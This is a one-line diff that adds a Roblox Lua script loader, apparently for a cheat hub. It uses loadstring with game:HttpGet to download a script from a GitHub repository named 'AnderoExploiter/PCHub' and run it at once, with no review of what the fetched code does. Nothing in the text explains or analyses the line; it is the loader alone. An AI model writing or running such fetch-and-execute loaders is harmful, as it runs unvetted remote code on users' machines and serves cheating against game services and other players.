@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AnderoExploiter/PCHub/main/Andero%20Hub.txt'))()
